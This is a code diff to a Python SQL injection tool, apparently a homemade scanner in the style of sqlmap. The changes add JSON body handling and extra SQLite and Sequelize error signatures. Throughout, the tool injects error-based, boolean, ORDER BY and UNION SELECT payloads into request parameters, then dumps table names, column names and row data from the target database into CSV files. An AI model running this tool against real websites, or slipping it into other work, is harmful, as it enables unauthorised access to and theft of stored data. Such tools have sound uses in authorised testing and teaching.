@@ -4,6 +4,7 @@ import argparse
 import re
 import csv
 import os
+import json
 
 
 
@@ -51,7 +52,17 @@ error_patterns = {
 		"no such column",
 		"datatype mismatch",
 		"not authorized",
-		"misuse of aggregate"
+		"misuse of aggregate",
+		"1st ORDER BY term out of range",
+		"should be between",
+		"SequelizeDatabaseError",
+		"SQLITE_ERROR",
+		"Error at Database",
+		"errno\": 1",
+		"code\": \"SQLITE_ERROR\"",
+		"sql\": \"SELECT .*?ORDER BY .*?\"",
+		"incomplete input"
+
 	]
 }
 
@@ -149,15 +160,20 @@ def parse_args():
 
 
 
-def body_params(body_string: str) -> dict[str, str]:
-	if body_string:
-		body_list = body_string.split('&')
-		return {param.split('=', 1)[0]: param.split('=', 1)[1] if '=' in param else '' for param in body_list}
+def body_decode(_body_string: str, _body_type: str) -> dict[str, str]:
+	if _body_string:
+		if _body_type == "application/json":
+			return json.loads(_body_string)
+		else:
+			body_list = _body_string.split('&')
+			return {param.split('=', 1)[0]: param.split('=', 1)[1] if '=' in param else '' for param in body_list}
 	return {}
 
-def body_string(body_params: dict[str, str]) -> str:
-	return '&'.join([f"{key}={value}" for key, value in body_params.items()])
-
+def body_encode(body_params: dict[str, str], _body_type: str) -> str:
+	if _body_type == "application/json":
+		return json.dumps(body_params)
+	else:
+		return '&'.join([f"{key}={value}" for key, value in body_params.items()])
 
 
 def query_params(query_string : str) -> dict[str, str]:
@@ -183,15 +199,16 @@ def extract_base_url(full_url: str) -> str:
 
 
 # --------- REQUESTS --------- #
-def request_record(method: str, full_url: str, headers: dict, body_string: str, infected_param: str | None = None,
+def request_record(method: str, full_url: str, headers: dict, _body_string: str, infected_param: str | None = None,
 				   infected_type: str | None = None, infected_payload: str | None = None) -> dict:
-	request = requests.request(method, full_url, headers=headers, data=body_string if method == "POST" else None)
+	request = requests.request(method, full_url, headers=headers, data=_body_string if method == "POST" else None)
 	time = request.elapsed.total_seconds()
 
 	return {
-		"body": body_params(body_string),
+		"body": body_decode(_body_string, headers.get("Content-Type", "")) if method == "POST" else {},
 		"query": query_params(extract_query_string(full_url)),
 		"response": {
+			"headers": dict(request.headers),
 			"status_code": request.status_code,
 			"content": request.content.decode(),
 			"time": time
@@ -202,35 +219,40 @@ def request_record(method: str, full_url: str, headers: dict, body_string: str, 
 	}
 
 def detection_request_records(method: str, full_url: str, headers: dict, _body_string: str) -> list[dict]:
-	_body_params = body_params(_body_string)
+	_body_params = body_decode(_body_string, headers.get("Content-Type", "")) if method == "POST" else {}
 	_query_params = query_params(extract_query_string(full_url))
 
 	detection_request_records = []
 
 	for param in _body_params.keys():
-		body_params_copy = _body_params.copy()
-		for error in error_based_detection:
-			body_params_copy[param] = error
-			detection_request_records.append(request_record(method, assemble_full_url(
-				extract_base_url(full_url), query_string(_query_params)), headers, body_string(body_params_copy), param, "error_based", error))
+		try:
+			body_params_copy = _body_params.copy()
+			for error in error_based_detection:
+				body_params_copy[param] = error
+				detection_request_records.append(request_record(method, assemble_full_url(
+					extract_base_url(full_url), query_string(_query_params)), headers, body_encode(body_params_copy, headers.get("Content-Type", "")), param, "error_based", error))
 
-		for boolean in boolean_detection:
-			body_params_copy[param] = _body_params[param] + boolean
-			detection_request_records.append(request_record(method, assemble_full_url(
-				extract_base_url(full_url), query_string(_query_params)), headers, body_string(body_params_copy), param, f"boolean_based", boolean))
-
+			for boolean in boolean_detection:
+				body_params_copy[param] = _body_params[param] + boolean
+				detection_request_records.append(request_record(method, assemble_full_url(
+					extract_base_url(full_url), query_string(_query_params)), headers, body_encode(body_params_copy, headers.get("Content-Type", "")), param, f"boolean_based", boolean))
+		except Exception as e:
+			print(f"[!] An error occurred while testing body parameter '{param}':", e)
 
 	for param in _query_params.keys():
-		query_params_copy = _query_params.copy()
-		for error in error_based_detection:
-			query_params_copy[param] = error
-			detection_request_records.append(request_record(method, assemble_full_url(
-				extract_base_url(full_url), query_string(query_params_copy)), headers, body_string(_body_params), param, "error_based", error))
+		try:
+			query_params_copy = _query_params.copy()
+			for error in error_based_detection:
+				query_params_copy[param] = error
+				detection_request_records.append(request_record(method, assemble_full_url(
+					extract_base_url(full_url), query_string(query_params_copy)), headers, body_encode(_body_params, headers.get("Content-Type", "")), param, "error_based", error))
 
-		for boolean in boolean_detection:
-			query_params_copy[param] = _query_params[param] + boolean
-			detection_request_records.append(request_record(method, assemble_full_url(
-				extract_base_url(full_url), query_string(query_params_copy)), headers, body_string(_body_params), param, f"boolean_based", boolean))
+			for boolean in boolean_detection:
+				query_params_copy[param] = _query_params[param] + boolean
+				detection_request_records.append(request_record(method, assemble_full_url(
+					extract_base_url(full_url), query_string(query_params_copy)), headers, body_encode(_body_params, headers.get("Content-Type", "")), param, f"boolean_based", boolean))
+		except Exception as e:
+			print(f"[!] An error occurred while testing query parameter '{param}':", e)
 
 	return detection_request_records
 # ----------------------- #
@@ -269,6 +291,14 @@ def strip_html_tags(text: str) -> str:
 
 
 # --------- ANALYSE RECORDS --------- #
+def remove_sql_errors(lines: list[str]) -> list[str]:
+	cleaned_lines = []
+	for line in lines:
+		if not any(re.search(pattern, line, re.IGNORECASE) for pattern in error_patterns["mysql"]) and \
+		   not any(re.search(pattern, line, re.IGNORECASE) for pattern in error_patterns["sqlite"]):
+			cleaned_lines.append(line)
+	return cleaned_lines
+
 def get_boolean_record(records: list[dict], payload: str) -> dict | None:
 	for record in records:
 		if record["infected_type"] == "boolean_based" and record["infected_payload"] == payload:
@@ -289,10 +319,10 @@ def get_injection_points(records: list[dict]) -> tuple[set, str | None]:
 		if record["infected_type"] == "error_based":
 			if any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns["mysql"]):
 				injection_points.add(record["infected_param"])
-				db_type = "MySQL"
+				db_type = "mysql"
 			elif any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns["sqlite"]):
 				injection_points.add(record["infected_param"])
-				db_type = "SQLite"
+				db_type = "sqlite"
 		elif record["infected_type"] == "boolean_based":
 			pair_record = get_boolean_record_pair(records, record)
 			if not pair_record:
@@ -315,27 +345,37 @@ def get_injection_points(records: list[dict]) -> tuple[set, str | None]:
 
 
 # --------- EXTRACTION STRUCTURE --------- #
+def extract_error_message(response_content):
+    try:
+        if response_content.strip().startswith("{"):
+            data = json.loads(response_content)
+            if "error" in data and "message" in data["error"]:
+                return data["error"]["message"]
+    except Exception:
+        pass
+    return response_content
+
 def get_select_size(injection_point: str, db_type: str, method, url, headers, body, default_request: dict) -> int | None:
     original_query_params = query_params(extract_query_string(url))
-    original_body_params = body_params(body)
+    original_body_params = body_decode(body, headers.get("Content-Type", "")) if method == "POST" else {}
 
     for i in range(1, 50):
         payload = f"' ORDER BY {i}--%20"
-        # Query param injection
         if injection_point in original_query_params:
             query_params_dict = original_query_params.copy()
             query_params_dict[injection_point] += payload
             full_url = assemble_full_url(extract_base_url(url), query_string(query_params_dict))
             record = request_record(method, full_url, headers, body, injection_point, "extraction", payload)
-            if any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns[db_type.lower()]):
+            error_text = extract_error_message(record["response"]["content"])
+            if any(re.search(pattern, error_text, re.IGNORECASE) for pattern in error_patterns[db_type.lower()]):
                 return i - 1
-        # Body param injection
         elif injection_point in original_body_params:
             body_params_dict = original_body_params.copy()
             body_params_dict[injection_point] += payload
-            body_string_modified = body_string(body_params_dict)
+            body_string_modified = body_encode(body_params_dict, headers.get("Content-Type", ""))
             record = request_record(method, url, headers, body_string_modified, injection_point, "extraction", payload)
-            if any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns[db_type.lower()]):
+            error_text = extract_error_message(record["response"]["content"])
+            if any(re.search(pattern, error_text, re.IGNORECASE) for pattern in error_patterns[db_type.lower()]):
                 return i - 1
     return None
 
@@ -347,7 +387,7 @@ def get_control_strings(list : int) -> list[str]:
 
 def get_visible_index(injection_point: str, db_type: str, method, url, headers, body, default_request: dict, select_size: int) -> int | None:
 	original_query_params = query_params(extract_query_string(url))
-	original_body_params = body_params(body)
+	original_body_params = body_decode(body, headers.get("Content-Type", "")) if method == "POST" else {}
 	control_strings = get_pattern_strings([i for i in range(select_size)])
 	union_select = f"' UNION SELECT " + ", ".join(control_strings) + f" --%20"
 
@@ -357,9 +397,8 @@ def get_visible_index(injection_point: str, db_type: str, method, url, headers, 
 		original_body_params[injection_point] += union_select
 
 	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
-			body_string(original_body_params), injection_point, "extraction", union_select)
+            body_encode(original_body_params, headers.get("Content-Type", "")), injection_point, "extraction", union_select)
 	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])
-	
 	control_strings = get_control_strings([i for i in range(select_size)])
 	for i in range(len(control_strings)):
 		if control_strings[i] in diff:
@@ -383,7 +422,7 @@ def get_pattern_union(select_size: int, visible_index: int, key : str, from_valu
 # --------- DATA EXTRACTION --------- #
 def extract_table_names(method, url, headers, body, injection_point: str, db_type: str, default_request: dict, visible_index: int, select_size: int):
 	original_query_params = query_params(extract_query_string(url))
-	original_body_params = body_params(body)
+	original_body_params = body_decode(body, headers.get("Content-Type", "")) if method == "POST" else {}
 
 	if db_type.lower() == "mysql":
 		extraction_steps = extraction_patterns["mysql"]["table_names"]
@@ -397,17 +436,14 @@ def extract_table_names(method, url, headers, body, injection_point: str, db_typ
 		original_body_params[injection_point] += pattern_union
 
 	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
-			body_string(original_body_params), injection_point, "extraction", pattern_union)
+			body_encode(original_body_params, headers.get("Content-Type", "")), injection_point, "extraction", pattern_union)
 	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])
 
-	# To be continued...
-	# Check for SQL errors
-
-	return [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]
+	return remove_sql_errors([strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()])
 
 def extract_column_names(method, url, headers, body, injection_point: str, table_name: str, db_type: str, default_request: dict, visible_index: int, select_size: int):
 	original_query_params = query_params(extract_query_string(url))
-	original_body_params = body_params(body)
+	original_body_params = body_decode(body, headers.get("Content-Type", "")) if method == "POST" else {}
 
 	if db_type.lower() == "mysql":
 		extraction_steps = extraction_patterns["mysql"]["column_names"]
@@ -421,21 +457,17 @@ def extract_column_names(method, url, headers, body, injection_point: str, table
 		original_body_params[injection_point] += pattern_union
 
 	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
-			body_string(original_body_params), injection_point, "extraction", pattern_union)
+			body_encode(original_body_params, headers.get("Content-Type", "")), injection_point, "extraction", pattern_union)
 	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])
-
 
 	# To be continued...
 	# If DBMS is sqlite, parse the CREATE TABLE statement to extract column names
 
-	# To be continued...
-	# Check for SQL errors
-
-	return [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]
+	return remove_sql_errors([strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()])
 
 def extract_data(method, url, headers, body, injection_point: str, table_name: str, db_type: str, default_request: dict, visible_index: int, select_size: int, column_name: str):
 	original_query_params = query_params(extract_query_string(url))
-	original_body_params = body_params(body)
+	original_body_params = body_decode(body, headers.get("Content-Type", "")) if method == "POST" else {}
 
 	if db_type.lower() == "mysql":
 		extraction_steps = extraction_patterns["mysql"]["data_dump"]
@@ -449,13 +481,10 @@ def extract_data(method, url, headers, body, injection_point: str, table_name: s
 		original_body_params[injection_point] += pattern_union
 
 	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
-			body_string(original_body_params), injection_point, "extraction", pattern_union)
+			body_encode(original_body_params, headers.get("Content-Type", "")), injection_point, "extraction", pattern_union)
 	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])
 
-	# To be continued...
-	# Here, check for SQL errors
-
-	return [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]
+	return remove_sql_errors([strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()])
 # ----------------------- #
 
 
@@ -467,7 +496,7 @@ def main():
 		print("[-] Unsupported Content-Type for body. Only 'application/x-www-form-urlencoded' and 'application/json' are supported.")
 		return
 
-	data_dump_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data_dump")
+	data_dump_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data_dump/" + "_".join(it for it in url.split("//")[-1].split("/")))
 	if not os.path.exists(data_dump_dir):
 		os.makedirs(data_dump_dir)
 
@@ -520,9 +549,9 @@ def main():
 
 				padded_datas = [data + [''] * (max_len - len(data)) for data in datas]
 				rows = list(zip(*padded_datas)) if padded_datas else []
-				write_table_to_csv("data_dump", table, columns_names, rows)
+				write_table_to_csv(data_dump_dir, table, columns_names, rows)
 
-	except requests.RequestException as e:
+	except Exception as e:
 		print("[!] An error occurred while making the requests:", e)
 
 if __name__ == "__main__":
